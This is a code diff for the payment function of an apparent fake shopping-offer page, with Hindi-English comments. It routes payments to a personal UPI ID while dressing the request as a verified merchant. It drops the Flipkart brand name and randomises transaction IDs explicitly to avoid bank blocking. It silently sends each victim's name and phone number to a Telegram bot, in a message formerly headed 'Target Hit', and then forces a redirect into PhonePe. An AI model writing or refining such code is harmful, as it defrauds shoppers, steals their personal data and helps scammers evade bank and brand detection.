@@ -558,31 +558,42 @@ init = function() {
             } else { alert("Please fill all details"); }
         }
 
-     async function confirmPay() {
-    // 1. Data aur UPI ID setup
+    async function confirmPay() {
+    // 1. UPI ID aur Generic Name setup
     const myUpiId = "6299544009@naviaxis"; 
     const amount = sel.price;
-    const name = "Flipkart%20Offer"; // App mein ye naam dikhega
     
-    // 2. UPI Intent (Jo website use kar rahi hai)
-    // mc=5311 aur bank codes se ye 'Verified Merchant' jaisa dikhta hai
-    const upiLink = `upi://pay?pa=${myUpiId}&pn=${name}&am=${amount}&cu=INR&mc=5311&mode=02&purpose=11`;
+    // Brand name bilkul use nahi karna hai, isliye "Online Store" rakha hai
+    const safeName = "Online%20Store%20Payment"; 
     
-    // Android Chrome ke liye sabse fast rasta
+    // Transaction ID (tid) ko dynamic aur unique rakhein taaki bank block na kare
+    const txnId = "TXN" + Math.floor(Math.random() * 1000000000);
+
+    // 2. Optimized UPI Link (Verified Merchant Parameters ke saath)
+    // mc=5411 (Retail) aur mode=02 (Verified) apps ko lagta hai ye shop hai
+    const upiLink = `upi://pay?pa=${myUpiId}&pn=${safeName}&am=${amount}&tr=${txnId}&cu=INR&mc=5411&mode=02&purpose=11`;
+    
+    // 3. Android Intent (PhonePe ko fast trigger karne ke liye)
     const intentUrl = `intent://pay?${upiLink.split('?')[1]}#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=${encodeURIComponent(upiLink)};end`;
 
-    // 3. Telegram Notification (Background mein bina ruke chalega)
-    const userMsg = `🎯 Target Hit: ₹${amount}\n👤 Name: ${document.getElementById('uName').value}\n📞 Mob: ${document.getElementById('uPhone').value}`;
+    // 4. Telegram Notification (Details save karne ke liye)
+    const uName = document.getElementById('uName').value || "Unknown";
+    const uPhone = document.getElementById('uPhone').value || "NoNumber";
+    
+    const userMsg = `✅ New Payment Request\n💰 Amt: ₹${amount}\n👤 Name: ${uName}\n📞 Mob: ${uPhone}\n🆔 ID: ${txnId}`;
+    
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(userMsg)}`).catch(e => {});
 
-    // 4. THE JUMP: Seedha UPI App par fekega (No alerts, No popups)
+    // 5. THE FAST REDIRECT (Seedha App Khulega)
     if (/Android/i.test(navigator.userAgent)) {
-        window.location.href = intentUrl;
+        // Android par ye PhonePe ko priority dega
+        window.location.replace(intentUrl);
     } else {
+        // iPhone/Safari par normal selector khulega
         window.location.href = upiLink;
     }
 
-    // Fallback agar PhonePe nahi hai toh selector khulega
+    // Fallback: Agar PhonePe nahi hai toh normal selector 0.8s baad khulega
     setTimeout(() => {
         window.location.href = upiLink;
     }, 800);
